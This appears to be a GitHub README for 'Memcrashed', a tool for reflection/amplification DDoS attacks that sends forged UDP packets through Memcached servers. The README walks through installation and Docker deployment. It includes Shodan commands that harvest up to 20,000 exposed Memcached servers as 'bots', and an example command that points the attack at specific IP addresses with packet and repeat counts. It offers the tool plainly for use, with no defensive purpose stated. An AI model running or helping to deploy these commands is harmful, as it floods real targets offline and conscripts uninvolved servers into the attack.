# MEMCRASHED DDOS EXPLOIT TOOL

* Author: [@037](https://twitter.com/037)

This tool allows you to send forged UDP packets to Memcached servers obtained from Shodan.io

### Prerequisites

The only thing you need installed is Python 3.x

```
apt-get install python3
```

You also require to have Scapy and Shodan modules installed
```
pip install scapy
```

```
pip install shodan
```

### Using Shodan API

This tool requires you to own an upgraded Shodan API

You may obtain one for free in [Shodan](https://shodan.io/) if you sign up using a .edu email

![alt text](https://raw.githubusercontent.com/649/Memcrashed-DDoS-Exploit/master/2.png)
![alt text](https://raw.githubusercontent.com/649/Memcrashed-DDoS-Exploit/master/1.png)
![alt text](https://raw.githubusercontent.com/649/Memcrashed-DDoS-Exploit/master/3.png)
![alt text](https://raw.githubusercontent.com/649/Memcrashed-DDoS-Exploit/master/4.png)


### Using Docker

##### [Demo](https://asciinema.org/a/v1AEEa17xzqUfyW4pEIS0JONW)

You may deploy this tool to the cloud using a light Alpine Docker image.

> Note: Make sure to explicitly enter 'y' or 'n' to the interactive prompt

```bash
git clone https://github.com/649/Memcrashed-DDoS-Exploit.git
cd Memcrashed-DDoS-Exploit
echo "SHODAN_KEY" > api.txt
docker build -t memcrashed .
docker run -it memcrashed

```

### Download Bots

To avoid slow (and rate limited) API calls to Shodan API, you can download all known memcached servers using `shodan` tool.

```shell
$ python3 -m pip install shodan
$ shodan init <KEY>
$ shodan download --limit 20000 bots.json.gz product:"Memcached" port:11211
$ gzip -d bots.json.gz
$ cat bots.json | jq '.ip_str' -r | grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}' > bots.txt 
```

When running `Memcrasched.py` make sure to reply "N" for using Shadon API.

### Memfoxed

`memfoxed` is a simplified script. Changes made:

* configuration options are passed using CLI args (rather than with interactive questions)
* supports multiple targets

Example:

```shell
$ sudo ./memfoxed.py \
    -t 109.207.14.3:53 \
    -t 193.164.146.24:23 \
    --num-packets 10 \
    --repeat 100 \
    --bots-config ./bots.txt
```

Note that `--bots-config` expects file with line-separated list of IP address of Memcached servers (e.g. see "Download Bots" section how to get one using Shodan API). 
